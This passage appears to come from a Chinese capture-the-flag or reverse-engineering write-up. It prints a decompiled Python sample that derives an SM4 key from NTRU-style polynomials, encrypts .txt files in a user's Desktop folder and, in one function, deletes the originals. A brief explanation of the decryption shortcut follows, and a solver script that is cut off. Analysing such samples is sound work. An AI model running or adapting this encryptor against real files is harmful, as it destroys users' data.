punctuation\">)</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> h<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt_message</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    e <span class=\"token operator\">=</span> lift_mod<span class=\"token punctuation\">(</span>p <span class=\"token operator\">*</span> convolution<span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> generate_T<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> m<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> e\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">save_ntru_keys</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    h<span class=\"token punctuation\">,</span> secret <span class=\"token operator\">=</span> generate_key<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pub_key.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    m <span class=\"token operator\">=</span> generate_message<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"priv_key.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    e <span class=\"token operator\">=</span> encrypt_message<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"enc.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">terms</span><span class=\"token punctuation\">(</span>poly_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    terms <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    pattern <span class=\"token operator\">=</span> <span class=\"token string\">r'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)'</span>\n    matches <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>finditer<span class=\"token punctuation\">(</span>pattern<span class=\"token punctuation\">,</span> poly_str<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token keyword\">match</span> <span class=\"token keyword\">in</span> matches<span class=\"token punctuation\">:</span>\n        term <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'+x'</span> <span class=\"token keyword\">or</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">:</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'-x'</span><span class=\"token punctuation\">:</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> <span class=\"token string\">'x^'</span> <span class=\"token keyword\">in</span> term<span class=\"token punctuation\">:</span>\n            coeff_part <span class=\"token operator\">=</span> term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            exponent <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> coeff_part <span class=\"token keyword\">or</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n            <span class=\"token keyword\">elif</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>coeff_part<span class=\"token punctuation\">)</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>coeff <span class=\"token operator\">*</span> exponent<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> <span class=\"token string\">'x'</span> <span class=\"token keyword\">in</span> term<span class=\"token punctuation\">:</span>\n            coeff_part <span class=\"token operator\">=</span> term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> coeff_part <span class=\"token keyword\">or</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">elif</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>coeff_part<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'+1'</span> <span class=\"token keyword\">or</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> terms\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">gen_key</span><span class=\"token punctuation\">(</span>poly_terms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    binary <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">128</span>\n    <span class=\"token keyword\">for</span> term <span class=\"token keyword\">in</span> poly_terms<span class=\"token punctuation\">:</span>\n        exponent <span class=\"token operator\">=</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>term<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> term <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> exponent <span class=\"token operator\">&lt;=</span> <span class=\"token number\">127</span><span class=\"token punctuation\">:</span>  \n            binary<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> exponent<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    binary_str <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> binary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    hex_key <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>binary_str<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> hex_key\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">read_polynomial_from_file</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">sm4_encrypt</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> plaintext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"SM4 key must be 16 bytes\"</span>\n    cipher <span class=\"token operator\">=</span> sm4<span class=\"token punctuation\">.</span>CryptSM4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cipher<span class=\"token punctuation\">.</span>set_key<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> sm4<span class=\"token punctuation\">.</span>SM4_ENCRYPT<span class=\"token punctuation\">)</span>\n    padded_plaintext <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cipher<span class=\"token punctuation\">.</span>crypt_ecb<span class=\"token punctuation\">(</span>padded_plaintext<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">sm4_encrypt_file</span><span class=\"token punctuation\">(</span>input_path<span class=\"token punctuation\">,</span> output_path<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        plaintext <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    ciphertext <span class=\"token operator\">=</span> sm4_encrypt<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> plaintext<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">resource_path</span><span class=\"token punctuation\">(</span>relative_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">,</span> <span class=\"token string\">'frozen'</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        base_path <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>_MEIPASS\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        base_path <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>abspath<span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>base_path<span class=\"token punctuation\">,</span> relative_path<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt_directory</span><span class=\"token punctuation\">(</span>directory<span class=\"token punctuation\">,</span> sm4_key<span class=\"token punctuation\">,</span> extensions<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\".txt\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>directory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Directory does not exist: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>directory<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span>\n    \n    <span class=\"token keyword\">for</span> root<span class=\"token punctuation\">,</span> _<span class=\"token punctuation\">,</span> files <span class=\"token keyword\">in</span> os<span class=\"token punctuation\">.</span>walk<span class=\"token punctuation\">(</span>directory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> files<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">any</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span>ext<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> ext <span class=\"token keyword\">in</span> extensions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                input_path <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span>\n                output_path <span class=\"token operator\">=</span> input_path <span class=\"token operator\">+</span> <span class=\"token string\">\".enc\"</span>\n                \n                <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                    sm4_encrypt_file<span class=\"token punctuation\">(</span>input_path<span class=\"token punctuation\">,</span> output_path<span class=\"token punctuation\">,</span> sm4_key<span class=\"token punctuation\">)</span>\n                    os<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span>input_path<span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Encrypted: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>input_path<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>output_path<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Error encrypting </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>input_path<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        save_ntru_keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        poly_str <span class=\"token operator\">=</span> read_polynomial_from_file<span class=\"token punctuation\">(</span><span class=\"token string\">\"priv_key.txt\"</span><span class=\"token punctuation\">)</span>\n        poly_terms <span class=\"token operator\">=</span> terms<span class=\"token punctuation\">(</span>poly_str<span class=\"token punctuation\">)</span>\n        sm4_key <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>unhexlify<span class=\"token punctuation\">(</span>poly_terms<span class=\"token punctuation\">)</span>\n        user_name <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>getlogin<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        target_dir <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\Users\"</span><span class=\"token punctuation\">,</span> user_name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Desktop\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"test_files\"</span><span class=\"token punctuation\">)</span>\n        \n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            os<span class=\"token punctuation\">.</span>makedirs<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">,</span> exist_ok<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Created directory: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>target_dir<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span>\n            \n        txt_files <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>f <span class=\"token keyword\">for</span> f <span class=\"token keyword\">in</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">)</span> \n                    <span class=\"token keyword\">if</span> f<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">'.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isfile<span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n        \n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> txt_files<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No .txt files found in directory\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span>\n            \n        <span class=\"token keyword\">for</span> txt_file <span class=\"token keyword\">in</span> txt_files<span class=\"token punctuation\">:</span>\n            file_path <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">,</span> txt_file<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n                    test_data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                \n                ciphertext <span class=\"token operator\">=</span> sm4_encrypt<span class=\"token punctuation\">(</span>sm4_key<span class=\"token punctuation\">,</span> test_data<span class=\"token punctuation\">)</span>\n                encrypted_path <span class=\"token operator\">=</span> file_path <span class=\"token operator\">+</span> <span class=\"token string\">'.enc'</span>\n                \n                <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>encrypted_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n                    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Error processing </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>txt_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                \n    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Fatal error: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>发现将是多项式m转换为SM4密钥加密，p，d&#x3D;3本来应该对enc多项式取模获得m，但是发现反编译出的文件有enc.txt和pub_key.txt，其中enc.txt里有两个多项式，使用第二个居然可以直接解密。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> gmssl <span class=\"token keyword\">import</span> sm4\n<span class=\"token keyword\">import</span> binascii\n<span class=\"token keyword\">import</span> re\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">terms</span><span class=\"token punctuation\">(</span>poly_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    terms <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    pattern <span class=\"token operator\">=</span> <span class=\"token string\">r'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)'</span>\n    matches <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>finditer<span class=\"token punctuation\">(</span>pattern<span class=\"token punctuation\">,</span> poly_str<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">for</span> <span class=\"token keyword\">match</span> <span class=\"token keyword\">in</span> matches<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">)</span>\n        term <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'+x'</span> <span class=\"token keyword\">or</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">:</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'-x'</span><span class=\"token punctuation\">:</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> <span class=\"token string\">'x^'</span> <span class=\"token keyword\">in</span> term<span class=\"token punctuation\">:</span>\n            coeff_part <span class=\"token operator\">=</span> term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            exponent <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> coeff_part <span class=\"token keyword\">or</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n            <span class=\"token keyword\">elif</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>coeff_part<span class=\"token punctuation\">)</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>coeff <span class=\"token operator\">*</span> exponent<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> <span class=\"token string\">'x'</span> <span class=\"token keyword\">in</span> term<span class=\"token punctuation\">:</span>\n            coeff_part <span class=\"token operator\">=</span> term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> coeff_part <span class=\"token keyword\">or</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span 